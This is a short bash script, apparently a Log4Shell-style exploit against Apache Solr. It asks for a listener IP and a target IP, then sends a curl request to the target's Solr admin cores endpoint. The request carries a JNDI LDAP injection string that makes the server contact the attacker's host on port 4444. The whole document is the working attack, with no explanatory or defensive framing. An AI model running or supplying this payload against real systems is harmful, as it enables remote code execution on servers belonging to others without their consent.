#!/bin/bash

read -p "LISTENER IP: " attacker
read -p "TARGET IP: " target
curl "http://${target}:8983/solr/admin/cores?foo=$\{jndi:ldap://${attacker}:4444\}"
